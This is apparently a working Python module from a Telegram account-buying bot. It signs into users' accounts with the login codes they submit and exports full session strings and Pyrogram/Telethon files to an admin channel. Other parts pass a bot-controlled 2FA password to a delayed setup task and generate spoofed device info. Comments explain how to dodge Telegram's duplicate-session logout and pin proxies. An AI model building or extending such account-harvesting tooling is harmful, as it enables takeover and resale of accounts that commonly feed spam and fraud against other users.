"""
OTP verification.
=====================================================================
NEW WORKFLOW (v3 - Out-of-Order OTP Support): verifies an OTP code
against waiting sessions (newest first), exports the session files,
reports instantly to the pending channel, and spawns the delayed
2FA + spam-check background task.
"""

import asyncio
import os
import random
import logging
import time
from datetime import datetime, timedelta

from pyrogram.client import Client
from pyrogram.errors import (
    PhoneCodeInvalid,
    PhoneCodeExpired,
    FloodWait,
    SessionPasswordNeeded,
)

_logger = logging.getLogger(__name__)

# P7-68: per-user wrong-code budget at the OTP entry. After this many wrong
# codes the user is locked out for _OTP_WRONG_LOCKOUT_MINUTES (in-memory:
# restart clears it, which is acceptable - the phone gate + rate limiter
# remain the durable layers). The counter EXPIRES after the lockout window
# since the last wrong attempt, so a user is never locked forever.
_OTP_MAX_WRONG_ATTEMPTS = 5
_OTP_WRONG_LOCKOUT_MINUTES = 10
_otp_wrong_attempts: dict = {}


def _record_otp_wrong_attempt(user_id: int) -> None:
    """Count a wrong code for the user (resets on success)."""
    entry = _otp_wrong_attempts.get(int(user_id))
    now = datetime.now()
    if isinstance(entry, dict):
        first_at = entry.get("first_at")
        try:
            expired = (now - datetime.fromisoformat(str(first_at))).total_seconds() > 3600
        except (ValueError, TypeError):
            expired = True
        if expired:
            _otp_wrong_attempts[int(user_id)] = {"count": 1, "first_at": now.isoformat()}
        else:
            entry["count"] = int(entry.get("count", 0)) + 1
    else:
        _otp_wrong_attempts[int(user_id)] = {"count": 1, "first_at": now.isoformat()}


def _otp_wrong_count(user_id: int) -> int:
    """Current wrong-attempt count for the user (0 when the window expired)."""
    entry = _otp_wrong_attempts.get(int(user_id))
    if not isinstance(entry, dict):
        return 0
    try:
        expired = (datetime.now() - datetime.fromisoformat(str(entry.get("first_at")))).total_seconds() > 3600
    except (ValueError, TypeError):
        return 0
    return 0 if expired else int(entry.get("count", 0))


def _reset_otp_wrong_attempts(user_id: int) -> None:
    _otp_wrong_attempts.pop(int(user_id), None)

from bot import config
from bot.services.reports import (
    build_pending_report,
    build_rejected_report,
    build_task_failure_report,
    send_report_to_channel,
)
from bot.utils.anti_spam import (
    record_verification_attempt,
    smart_flood_wait_handler,
)
from bot.utils.country_data import get_flag
from bot.utils.fast_cache import format_message_fast
from bot.utils.i18n import get_user_lang, t
from bot.utils.net_timeouts import op_with_timeout, teardown_with_timeout
from bot.utils.storage import (
    add_pending_session,
    get_country_timeout,
    get_message_template,
    get_user_info,
    get_pending_session,
    reject_pending_session,
    replace_pending_session_data,
)
from bot.verification.state import _active_sessions
from bot.verification.steps import cleanup_session
from bot.verification.telethon_export import get_user_access_hash, session_string_to_telethon
from bot.services.session_formats import generate_pyrogram_file
from bot.verification.twofa import (
    MIN_TIMEOUT_SECONDS,
    build_initial_session_data,
    delayed_2fa_and_spam_check,
)
from bot.utils.api_rotation import record_api_usage
from bot.utils.bg_tasks import spawn_background

# How many times a FloodWait on ``sign_in`` may be waited out before the SAME
# OTP code is given up on. A FloodWait used to fall straight through its
# ``except`` block into the next session, so a PERFECTLY VALID code was never
# retried and the user was told "Invalid OTP Code" - and Telegram had in fact
# already consumed the attempt.
_SIGN_IN_FLOOD_RETRIES = 2

# P4-40: how many times a TRANSPORT/network error on ``sign_in`` is re-dialed
# and retried before the SAME code is given up on. A transport error means the
# request never reached Telegram's auth layer, so the ``phone_code_hash`` is
# NOT burned and the client can simply be connected again.
_SIGN_IN_NETWORK_RETRIES = 2
_SIGN_IN_NETWORK_RETRY_SLEEP = 2.5


def _is_transport_error(err: Exception) -> bool:
    """True when the exception is a transport/network failure, not an RPC answer.

    Pyrogram's connection layer raises the BUILTIN ``ConnectionError`` after
    its own connect retries are exhausted, lets ``OSError`` socket failures
    propagate out of send/recv, and the session raises the builtin
    ``TimeoutError`` (== ``asyncio.TimeoutError`` on 3.11+) when Telegram never
    answered. Pyrogram's ``errors.Timeout`` (503) is also transport-level: the
    request was never processed, so the code/hash are untouched. Everything
    else (including all other RPCError subclasses) is a real Telegram answer.
    """
    if isinstance(err, (ConnectionError, TimeoutError, OSError, asyncio.TimeoutError)):
        return True
    name = str(getattr(err, "NAME", "") or type(err).__name__).upper()
    return name == "TIMEOUT"


async def _sign_in_with_flood_retry(client, phone: str, phone_code_hash: str, otp_code: str):
    """``client.sign_in`` with bounded FloodWait + transport retries.

    Returns ``(outcome, error)`` where outcome is one of
    ``OK`` / ``INVALID`` / ``EXPIRED`` / ``2FA`` / ``FLOOD`` / ``ERROR``.
    ``smart_flood_wait_handler`` already performed the wait when it returns
    True, so the same code is simply re-submitted.

    P4-40: a transport/network error (dead proxy, blackholed DC) used to map
    ANY non-RPC exception to ``ERROR`` -> permanent failure -> session
    cleaned up -> user had to resubmit the phone. Now the same client is
    re-dialed (``client.connect()``) and ``sign_in`` retried up to 2 times
    with a short sleep; only when the retries are exhausted is ``ERROR``
    returned - and the caller now keeps the waiting session so the user can
    retry the SAME code (the hash is never burned by a transport error).
    """
    attempts = 0
    while True:
        try:
            await op_with_timeout(client.sign_in(phone, phone_code_hash, otp_code), "otp-sign-in")
            return "OK", None
        except PhoneCodeInvalid:
            return "INVALID", None
        except PhoneCodeExpired:
            return "EXPIRED", None
        except SessionPasswordNeeded:
            return "2FA", None
        except FloodWait as flood_err:
            attempts += 1
            recovered = await smart_flood_wait_handler(flood_err, "sign_in")
            if recovered and attempts <= _SIGN_IN_FLOOD_RETRIES:
                print(f"⏳ FloodWait on {phone} - waited it out, retrying the SAME "
                      f"code (attempt {attempts}/{_SIGN_IN_FLOOD_RETRIES})")
                continue
            return "FLOOD", flood_err
        except Exception as err:
            if _is_transport_error(err):
                attempts += 1
                if attempts <= _SIGN_IN_NETWORK_RETRIES:
                    print(f"⏳ Transport error on {phone} - re-dialing and retrying the "
                          f"SAME code (attempt {attempts}/{_SIGN_IN_NETWORK_RETRIES}): {err}")
                    try:
                        await asyncio.sleep(_SIGN_IN_NETWORK_RETRY_SLEEP)
                        await client.connect()
                    except Exception:
                        pass
                    continue
                print(f"❌ Transport error on {phone} after {_SIGN_IN_NETWORK_RETRIES} "
                      f"re-dials - giving up for now: {err}")
            return "ERROR", err


async def verify_otp_and_setup_2fa(user_id: int, otp_code: str, bot_client: Client):
    """
    NEW WORKFLOW (v3 - Out-of-Order OTP Support):
    1. OTP verify -> Tries sessions in order (newest first) until one succeeds
    2. 120 seconds (2FA setup) - background
    3. 180 seconds (Spam check) - background
    4. Final message with balance update
    
    OUT-OF-ORDER OTP HANDLING:
    - User may submit Phone A, then Phone B, but receive OTP A first
    - We try OTP on each waiting session in order (newest first)
    - PhoneCodeInvalid: Move to next session
    - Any other error: Stop immediately and return that error
    - Success: Process only that session, leave others intact
    
    Args:
        user_id: Telegram user ID
        otp_code: OTP code from user
        bot_client: Main bot client for channel messages
    
    Returns:
        tuple: (success: bool, message: str)
    """
    if user_id not in _active_sessions:
        return False, t("no_active_session_error", get_user_lang(int(user_id)))

    # P7-66 + P7-68: per-user OTP flood control (5/min, 50/hour) plus a hard
    # cap on consecutive WRONG codes per OTP entry. The phone-submission gate
    # (5-fail lockout) only counts submission failures - OTP typing needs its
    # own bounded budget so a bot farm cannot brute-force codes.
    try:
        from bot.handlers.admin.router import is_admin
        if not is_admin(user_id):
            from bot.utils.rate_limiter import check_rate_limit
            allowed, rl_msg, _retry = await check_rate_limit(user_id, "verify_otp")
            if not allowed:
                return False, rl_msg
            wrong_count = _otp_wrong_count(int(user_id))
            if wrong_count >= _OTP_MAX_WRONG_ATTEMPTS:
                return False, t(
                    "rate_limit_failed_attempts",
                    get_user_lang(int(user_id)),
                    minutes=_OTP_WRONG_LOCKOUT_MINUTES,
                )
    except ImportError:
        pass

    user_sessions = _active_sessions[user_id]
    
    latest_waiting_phone = user_sessions.get("_latest_waiting_phone")
    
    waiting_sessions = [(p, s) for p, s in user_sessions.items() 
                        if isinstance(s, dict) and s.get("step") == "waiting_otp"]
    
    if not waiting_sessions:
        if "_latest_waiting_phone" in user_sessions:
            del user_sessions["_latest_waiting_phone"]
        return False, t("no_session_waiting_error", get_user_lang(int(user_id)))
    
    def get_session_timestamp(session_tuple):
        """Extract timestamp from session for sorting (newest first)"""
        phone, session = session_tuple
        started_at = session.get("started_at", "")
        try:
            if started_at:
                return datetime.fromisoformat(started_at)
        except (ValueError, TypeError):
            pass
        return datetime.min
    
    waiting_sessions.sort(key=get_session_timestamp, reverse=True)
    
    ordered_sessions = []
    tried_phones = set()
    
    if latest_waiting_phone:
        for phone, session in waiting_sessions:
            if phone == latest_waiting_phone:
                ordered_sessions.append((phone, session))
                tried_phones.add(phone)
                print(f"📍 Priority: Latest waiting phone {phone} placed first")
                break
    
    for phone, session in waiting_sessions:
        if phone not in tried_phones:
            ordered_sessions.append((phone, session))
            tried_phones.add(phone)
    
    print(f"🔄 OUT-OF-ORDER OTP: Will try {len(ordered_sessions)} sessions in order:")
    for i, (phone, _) in enumerate(ordered_sessions):
        _logger.debug(f"   {i+1}. {phone}")
    
    session_data = None
    phone = None
    verification_error = None
    permanent_failure = False
    tried_count = 0
    invalid_otp_phones = []
    transport_error_phone = None
    
    for current_phone, current_session in ordered_sessions:
        tried_count += 1
        print(f"🎯 Trying OTP on session {tried_count}/{len(ordered_sessions)}: {current_phone}")
        
        client = current_session.get("client")
        phone_code_hash = current_session.get("phone_code_hash")
        country_code = current_session.get("country_code") or "UNKNOWN"

        # These were bare ``current_session[...]`` subscripts. A session dict
        # that lost a key (process killed between creation steps, a partially
        # restored record) raised KeyError here, which the caller reported as a
        # generic failure and the user's valid code was thrown away.
        if client is None or not phone_code_hash:
            print(f"❌ Session state incomplete for {current_phone} "
                  f"(client={'set' if client else 'missing'}, "
                  f"hash={'set' if phone_code_hash else 'missing'}) - skipping")
            await cleanup_session(user_id, current_phone)
            continue

        outcome, sign_in_error = await _sign_in_with_flood_retry(
            client, current_phone, phone_code_hash, otp_code
        )

        if outcome == "OK":
            print(f"✅ OTP verified for {current_phone}")
            _reset_otp_wrong_attempts(user_id)
            record_api_usage(
                api_name=current_session.get("api_name"),
                success=True,
            )
            session_data = current_session
            phone = current_phone
            break

        if outcome == "INVALID":
            print(f"⚠️ PhoneCodeInvalid for {current_phone} - trying next session")
            _record_otp_wrong_attempt(user_id)
            invalid_otp_phones.append(current_phone)
            continue

        if outcome == "FLOOD":
            wait_time = getattr(sign_in_error, "value", 30) or 30
            print(f"❌ FloodWait for {current_phone} - stopping immediately")
            # P2-20: a FloodWait is Telegram rate-limiting the BOT'S OWN
            # traffic, not the user's fault. It no longer counts toward the
            # user's 5-fail lockout.
            record_api_usage(
                api_name=current_session.get("api_name"),
                success=False,
                flood=True,
            )
            await cleanup_session(user_id, current_phone)
            verification_error = t(
                "too_many_login_attempts",
                get_user_lang(int(user_id)),
                phone=current_phone,
                wait_time=wait_time,
            )
            permanent_failure = True
            break

        if outcome == "EXPIRED":
            print(f"❌ PhoneCodeExpired for {current_phone} - stopping immediately")
            await cleanup_session(user_id, current_phone)
            verification_error = t(
                "otp_code_expired",
                get_user_lang(int(user_id)),
                phone=current_phone,
            )
            permanent_failure = True
            break

        if outcome == "2FA":
            print(f"❌ SessionPasswordNeeded for {current_phone} - stopping immediately")
            await cleanup_session(user_id, current_phone)
            verification_error = get_message_template("twofa_already_active_message", lang=get_user_lang(int(user_id)))
            permanent_failure = True
            break

        # P4-40: a transport/network error (all retries inside
        # ``_sign_in_with_flood_retry`` exhausted) is NOT terminal and does NOT
        # burn the phone_code_hash - the request never reached Telegram's auth
        # layer. The waiting session entry is KEPT so the user can retry the
        # SAME code once more; only wrong-code/expired (real RPC answers) keep
        # the old permanent-failure behavior above.
        print(f"⚠️ Transport/network error for {current_phone} after retries: "
              f"{sign_in_error} - KEEPING session (resubmit the same code)")
        transport_error_phone = current_phone
        verification_error = t(
            "otp_transport_retry",
            get_user_lang(int(user_id)),
            phone=current_phone,
        )
        break
    
    if not session_data and not permanent_failure:
        if transport_error_phone:
            # P4-40: the transport-retry message from the loop must survive the
            # generic "no session verified" fallbacks below.
            pass
        elif invalid_otp_phones:
            phones_tried = ", ".join(invalid_otp_phones)
            verification_error = t(
                "otp_invalid_multiple",
                get_user_lang(int(user_id)),
                count=len(invalid_otp_phones),
                phones=phones_tried,
            )
        else:
            verification_error = get_message_template("invalid_otp_message", lang=get_user_lang(int(user_id)))
    
    if permanent_failure:
        remaining_sessions = [(p, s) for p, s in user_sessions.items() 
                             if isinstance(s, dict) and s.get("step") == "waiting_otp"]
        if remaining_sessions:
            new_latest = None
            latest_time = None
            for p, s in remaining_sessions:
                try:
                    started_at = s.get("started_at", "")
                    if started_at:
                        session_time = datetime.fromisoformat(started_at)
                        if latest_time is None or session_time > latest_time:
                            latest_time = session_time
                            new_latest = p
                except (ValueError, TypeError):
                    pass
            if new_latest:
                user_sessions["_latest_waiting_phone"] = new_latest
                print(f"📍 Updated latest waiting phone to: {new_latest}")
            elif "_latest_waiting_phone" in user_sessions:
                del user_sessions["_latest_waiting_phone"]
        elif "_latest_waiting_phone" in user_sessions:
            del user_sessions["_latest_waiting_phone"]
            print(f"📍 Cleared latest waiting phone marker (no remaining sessions)")
    
    if not session_data:
        return False, verification_error or get_message_template("invalid_otp_message", lang=get_user_lang(int(user_id)))
    
    if phone in user_sessions:
        del user_sessions[phone]
        print(f"📍 Removed verified session {phone} from active sessions")
    
    remaining_sessions = [(p, s) for p, s in user_sessions.items() 
                         if isinstance(s, dict) and s.get("step") == "waiting_otp"]
    if remaining_sessions:
        new_latest = None
        latest_time = None
        for p, s in remaining_sessions:
            try:
                started_at = s.get("started_at", "")
                if started_at:
                    session_time = datetime.fromisoformat(started_at)
                    if latest_time is None or session_time > latest_time:
                        latest_time = session_time
                        new_latest = p
            except (ValueError, TypeError):
                pass
        if new_latest:
            user_sessions["_latest_waiting_phone"] = new_latest
            print(f"📍 Updated latest waiting phone to next pending: {new_latest}")
        else:
            if "_latest_waiting_phone" in user_sessions:
                del user_sessions["_latest_waiting_phone"]
    else:
        if "_latest_waiting_phone" in user_sessions:
            del user_sessions["_latest_waiting_phone"]
            print(f"📍 Cleared latest waiting phone marker (all sessions verified)")
    
    print(f"✅ OUT-OF-ORDER OTP: Successfully verified {phone} after trying {tried_count} session(s)")

    # t=0 anchor: the country-timeout clock starts the moment the OTP code is
    # submitted and accepted. Everything below (session export, pending report,
    # check phase, deadline wait) is anchored to this instant, so the final
    # message lands at exactly t0 + timeout_seconds regardless of how long the
    # delayed task later waits for a concurrency slot.
    task_start_time = datetime.now()
    task_start_monotonic = time.monotonic()

    # ``session_data`` is the dict that just signed in successfully, so client
    # and phone_code_hash are necessarily present - but ``started_at`` and
    # ``country_code`` are written by a LATER step and a partially restored
    # record can be missing them. A bare subscript raised KeyError AFTER
    # Telegram had already consumed the OTP, which is unrecoverable for the
    # user; .get() with sane defaults keeps the verified login usable.
    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]
    country_code = session_data.get("country_code") or "UNKNOWN"
    started_at = session_data.get("started_at") or task_start_time.isoformat()
    phone_message_id = session_data.get("phone_message_id")
    session_api_id = session_data.get("api_id")
    session_api_hash = session_data.get("api_hash")
    session_api_name = session_data.get("api_name", "default")
    
    print(f"🛡️ NEW WORKFLOW: OTP verified for {phone}")
    print(f"🔄 ROUND-ROBIN: Using {session_api_name} for this session")
    
    try:
        me = await op_with_timeout(client.get_me(), "otp-get-me")
        print(f"✅ User info: {me.first_name} ({me.id})")
        
        user_access_hash = await get_user_access_hash(client, me.id)
        print(f"🔑 Got access_hash for user {me.id}: {user_access_hash}")
        
        session_string = None
        session_filename = None
        telethon_filename = None
        
        try:
            session_string = await client.export_session_string()
            print(f"✅ Session exported: {len(session_string)} chars")
            
            os.makedirs("sessions", exist_ok=True)
            timestamp = int(datetime.now().timestamp() * 1000)
            session_filename = f"sessions/{phone}_{timestamp}.session"

            # Write a VALID Pyrogram SQLite .session (NOT a text file of the
            # session string, which Pyrogram cannot load).
            generated_path = generate_pyrogram_file(
                session_string, session_filename, user_id=me.id, phone=phone
            )
            if generated_path:
                session_filename = generated_path
                print(f"✅ Session file saved: {session_filename}")
            else:
                # generate_pyrogram_file failed (bad session string, parse error,
                # etc.). session_filename is still the original path string, but
                # the file does not exist. Fall through gracefully: the blocks
                # below read session_filename only for the Telethon conversion
                # (which uses the path as a stem, not the file content) and for
                # the pending report. Both have try/except fallbacks.
                session_filename = None
                print(f"⚠️ Pyrogram session file generation FAILED for {phone}")

            try:
                telethon_filename = None
                if session_filename:
                    telethon_filename = session_filename.replace('.session', '_telethon.session')
                    if session_string_to_telethon(
                        session_string, 
                        telethon_filename, 
                        user_id=me.id, 
                        phone=phone, 
                        first_name=me.first_name or "", 
                        access_hash=user_access_hash
                    ):
                        print(f"✅ Telethon session created with full user info: {telethon_filename}")
            except Exception as te:
                print(f"⚠️ Telethon conversion: {te}")
                telethon_filename = None

            # JSON must be generated ALONGSIDE the session files (never only
            # the .session). This writes verified_sessions/<phone>.json at the
            # same moment the session files are produced, so both artifacts
            # always exist together - session AND json.
            try:
                from bot.services.session_io import build_session_data_full
                from bot.utils.device_generator import generate_device_info
                import json as _json
                os.makedirs("verified_sessions", exist_ok=True)
                json_path = os.path.join("verified_sessions", f"{phone.replace('+', '')}.json")
                session_json_data = build_session_data_full(
                    phone=phone,
                    session_info={
                        "user_id": me.id,
                        "first_name": me.first_name or "",
                        "last_name": me.last_name or "",
                        "username": getattr(me, "username", None),
                        "photo": getattr(me, "photo", None),
                        "language_code": getattr(me, "language_code", "en"),
                    },
                    session_string=session_string,
                    twofa_password=config.get_2fa_password(),
                    country_code=country_code,
                    rate=0,
                    account_status="pending",
                    status_details={},
                    user_id=str(user_id),
                    device_info=generate_device_info(),
                )
                with open(json_path, "w", encoding="utf-8") as jf:
                    jf.write(_json.dumps(session_json_data, indent=2, ensure_ascii=False))
                print(f"✅ JSON file created alongside session: {json_path}")
            except Exception as je:
                print(f"⚠️ JSON alongside generation error: {je}")
                
        except Exception as e:
            print(f"❌ Session export error: {e}")
            await cleanup_session(user_id, phone)
            return False, t("session_export_failed", get_user_lang(int(user_id)), error=str(e))
        
        # CRITICAL anti-logout: disconnect the verification client right after
        # the session string/files are produced. Keeping it connected makes
        # Telegram see the SAME auth key from two places at once (this bot +
        # the Desktop where the user opens the generated tdata), which triggers
        # AUTH_KEY_DUPLICATED and logs the account out. All later phases
        # (2FA/spam/device) create their own temp clients, so a disconnected
        # original client is handled safely.
        try:
            await teardown_with_timeout(client, "otp-early-disconnect")
            print(f"✅ Session client disconnected early (safe tdata access for {phone})")
        except Exception:
            pass
        
        if not session_string:
            await cleanup_session(user_id, phone)
            return False, t("session_export_failed_retry", get_user_lang(int(user_id)))
        
        if user_id in _active_sessions and phone in _active_sessions[user_id]:
            del _active_sessions[user_id][phone]
            if not _active_sessions[user_id]:
                del _active_sessions[user_id]
        
        flag = get_flag(country_code)
        base_timeout = get_country_timeout(country_code)
        timeout_seconds = max(int(base_timeout or 0), MIN_TIMEOUT_SECONDS)

        print(f"📤 INSTANT REPORT: Sending to pending channel immediately...")
        print(f"   - Country timeout: {base_timeout}s, Total (admin configured): {timeout_seconds}s")
        pending_report_sent = False
        pending_message_id = None
        is_document_message = True
        phone_message_id = None
        
        try:
            instant_pending_caption = build_pending_report(
                phone, country_code,
                title="New Pending Session - OTP Verified",
                name=f"{me.first_name or ''} {me.last_name or ''}".strip() or None,
                account_id=me.id,
                user_id=user_id,
                timeout_seconds=timeout_seconds,
            )

            # Send the pending report honoring the admin-selected session
            # format (Session Management -> Pending Session Mode, max 1).
            #
            # The pending channel ALWAYS receives the file of the admin-
            # selected format (tdata / pyrogram / telethon / txt) - the old
            # PENDING_FILE_REPORTS env gate (default OFF) silently stripped
            # the files and only a text went to the channel. The format
            # selection inside report_pending_or_multidevice is the single
            # source of truth; there is no env switch anymore.
            from bot.services.session_reporting import report_pending_or_multidevice
            sent_msg = await report_pending_or_multidevice(
                bot_client=bot_client,
                mode="pending",
                channel=config.get_channel("CHANNEL_SUBMIT"),
                phone=phone,
                session_string=session_string or "",
                report_text=instant_pending_caption,
                telethon_file=telethon_filename,
                pyrogram_file=session_filename,
                user_id=user_id,
            )
            pending_report_sent = sent_msg is not None
            pending_message_id = getattr(sent_msg, 'id', None) if pending_report_sent else None
            # Determine whether the sent message was a document (file) or text.
            # pyrogram.Message has ``document`` attribute; None means text-only.
            is_document_message = pending_report_sent and getattr(sent_msg, 'document', None) is not None
            print(f"📤 INSTANT REPORT sent to pending channel (msg_id={pending_message_id}, doc={is_document_message}, files=on (admin-selected format))")

        except Exception as e:
            import traceback
            print(f"❌ INSTANT REPORT ERROR: Failed to send to pending channel")
            print(f"❌ Error: {str(e)}")
            print(f"❌ Traceback:\n{traceback.format_exc()}")
        
        task_session_id = f"session_{me.id}_{int(task_start_time.timestamp() * 1000)}_{random.randint(1000, 9999)}"

        # Persist the pending session at t=0 (NOT after the concurrency slot is
        # acquired). This anchors `deadline_at` to the code-submit moment and
        # guarantees that even a bot restart while the task is queued cannot
        # lose the session - the exact-deadline timer takes over on restart.
        twofa_password = config.get_2fa_password()
        try:
            _login_proxy_used = session_data.get("proxy_used") or getattr(client, "_bot_proxy_key", "") or ""
            _login_proxy_attribution = session_data.get("proxy_attribution") or getattr(client, "_bot_proxy_attribution", "") or country_code
            # P4-41: persist the DIALABLE proxy pin of the login so every later
            # phase of this session sticks to the SAME proxy.
            _login_proxy_url = session_data.get("proxy_url") or getattr(client, "_bot_proxy_url", "") or ""
            initial_session_data = build_initial_session_data(
                user_id, me, phone, country_code, twofa_password, phone_message_id,
                proxy_used=_login_proxy_used,
                proxy_attribution=_login_proxy_attribution,
                proxy_url=_login_proxy_url,
            )
            # Mark the channel report pending flag so the monitor safety net
            # retries the PENDING channel report if it failed above (the
            # in-process background retry is lost on restart).
            if not pending_report_sent:
                initial_session_data["channel_report_pending"] = True
            add_pending_session(
                session_id=task_session_id,
                user_id=user_id,
                phone=phone,
                country_code=country_code,
                rate=0,
                timeout_seconds=timeout_seconds,
                session_string=session_string,
                twofa_password=twofa_password,
                session_data=initial_session_data,
                message_id=None,
                phone_message_id=phone_message_id,
                session_file=session_filename or "",
                telethon_file=telethon_filename or "",
                spam_status="pending",
                spam_status_details={},
                submitted_at=task_start_time.isoformat(),
                deadline_at=(task_start_time + timedelta(seconds=timeout_seconds)).isoformat(),
            )
            print(f"✅ RECOVERY: Pending session persisted at t=0 for {phone} (deadline anchored to code submit)")
        except Exception as init_err:
            print(f"⚠️ Could not persist initial pending session at t=0: {init_err}")

        print(f"🚀 Starting delayed workflow for {phone}...")
        print(f"   - Session ID: {task_session_id}")
        print(f"   - Task start time: {task_start_time.isoformat()}")
        print(f"   - Session string: {len(session_string)} chars ✅")
        print(f"   - Session file: {session_filename} ✅")
        print(f"   - Instant report sent: {pending_report_sent} (msg_id: {pending_message_id})")
        print(f"   - Check phase (2FA/spam/device) runs early, then exact-deadline wait")
        
        def task_error_callback(task, sid=task_session_id):
            """Callback to handle task errors - NEVER silently fail"""
            try:
                exc = task.exception()
                if exc:
                    import traceback
                    print(f"❌❌❌ CRITICAL: Delayed task FAILED for {phone} (session: {sid}) ❌❌❌")
                    print(f"❌ Exception type: {type(exc).__name__}")
                    print(f"❌ Exception: {str(exc)}")
                    print(f"❌ Traceback:\n{''.join(traceback.format_exception(type(exc), exc, exc.__traceback__))}")
                    
                    async def send_failure_notification_and_update_storage():
                        try:
                            from bot.utils.storage import get_pending_session, replace_pending_session_data
                            
                            existing_session = get_pending_session(sid)
                            if not existing_session:
                                print(f"⚠️ Session {sid} not found in storage, skipping recovery")
                                return
                            
                            if existing_session.get("status") != "pending":
                                print(f"⚠️ Session {sid} already processed (status: {existing_session.get('status')}), skipping")
                                return
                            
                            session_info = existing_session.get("session_data", {})
                            if session_info.get("message_send_success"):
                                print(f"⚠️ Session {sid} already sent message, skipping recovery")
                                return
                            
                            session_info["task_failed"] = True
                            session_info["task_error"] = str(exc)[:500]
                            session_info["task_failed_at"] = datetime.now().isoformat()
                            # The task crashed WITHOUT a verdict. Per the
                            # delivery rule the user only ever receives
                            # SUCCESS / MULTI-DEVICE / REJECTED - a raw
                            # "task failed" message is NEVER sent to the
                            # user. The session stays PENDING (ready_to_send
                            # stays False) so the monitor / recovery scan
                            # re-runs it and delivers a genuine verdict
                            # message later. Only the error is logged.
                            session_info["ready_to_send"] = False
                            if session_info.get("message_type") != "PENDING":
                                session_info["message_type"] = "TASK_FAILURE"
                            session_info["device_check_completed"] = False
                            # A stale precomputed message must never reach
                            # the fast path after a crash - drop it.
                            session_info.pop("precomputed_message", None)

                            replace_pending_session_data(sid, session_info)
                            print(f"✅ RECOVERY: Marked session {sid} as TASK_FAILURE in storage "
                                  f"(stays pending - recovery will deliver the verdict)")

                            try:
                                await send_report_to_channel(
                                    config.get_channel("CHANNEL_REJECTED"),
                                    build_task_failure_report(
                                        phone, country_code,
                                        user_id=user_id, session_id=sid,
                                        error=str(exc), report_label="TASK_CRASH",
                                    ),
                                    bot_client=bot_client,
                                )
                            except Exception as channel_err:
                                print(f"⚠️ Could not send failure report to channel: {channel_err}")

                        except Exception as recovery_err:
                            print(f"❌ RECOVERY FAILED: Could not update storage for failed task: {recovery_err}")

                    spawn_background(send_failure_notification_and_update_storage(),
                                     "otp-failure-notify")
                else:
                    print(f"✅ Delayed task completed successfully for {phone} (session: {sid})")
            except asyncio.CancelledError:
                print(f"⚠️ Delayed task was cancelled for {phone} (session: {sid})")
            except asyncio.InvalidStateError:
                pass
        
        delayed_task = asyncio.create_task(
            delayed_2fa_and_spam_check(
                user_id=user_id,
                client=client,
                phone=phone,
                country_code=country_code,
                session_string=session_string,
                session_filename=session_filename,
                telethon_filename=telethon_filename,
                me=me,
                bot_client=bot_client,
                phone_message_id=phone_message_id,
                pending_channel_message_id=pending_message_id,
                is_document_message=is_document_message,
                access_hash=user_access_hash,
                session_id=task_session_id,
                task_start_time=task_start_time,
                task_start_monotonic=task_start_monotonic,
                api_id=session_api_id,
                api_hash=session_api_hash
            )
        )
        delayed_task.add_done_callback(task_error_callback)

        # NOTE: do NOT re-import format_message_fast / get_user_lang / t here.
        # A function-scoped `from bot.utils.i18n import get_user_lang` makes the
        # name LOCAL for the WHOLE function body (CPython LOAD_FAST_CHECK), so
        # every earlier use of get_user_lang() in this function raised
        # UnboundLocalError and the user only ever saw the generic error message.
        # The module-level imports at the top of this file are the single source
        # of truth.
        received_time = datetime.now().strftime("%H:%M:%S")
        eta_min, eta_sec = divmod(timeout_seconds, 60)
        eta_min_sec = f"{eta_min}m {eta_sec:02d}s"
        instant_message = format_message_fast(
            "account_received_message",
            get_user_lang(user_id),
            phone=phone,
            flag=flag,
            timeout=timeout_seconds,
            received_time=received_time,
            eta_min_sec=eta_min_sec,
        )
        
        print(f"✅ Background task started for {phone}")
        print(f"   - Message ID: {phone_message_id} (for editing updates)")
        print(f"   - Country: {country_code}, Timeout: {timeout_seconds}s")
        print(f"   - Session will be verified and balance added after processing")
        
        return True, instant_message, task_session_id
        
    except Exception as e:
        await cleanup_session(user_id, phone)
        # P2-20: the export/report chain failing is an infrastructure error,
        # not the user's fault - only user-fault errors count toward the
        # 5-fail cooldown.
        from bot.utils.anti_spam import is_user_fault_error
        if is_user_fault_error(e):
            record_verification_attempt(user_id, country_code, False)
        
        try:
            await send_report_to_channel(
                config.get_channel("CHANNEL_REJECTED"),
                build_rejected_report(phone, country_code, str(e), user_id=user_id),
                bot_client=bot_client,
            )
        except Exception:
            pass  # Channel notification is non-critical

        # Localized, not a hardcoded English string: this is the catch-all the
        # user actually sees when anything in the export/report chain fails, and
        # 12 of 13 supported languages were shown raw English here.
        return False, t(
            "verification_failed_generic",
            get_user_lang(int(user_id)),
            error=str(e),
        )
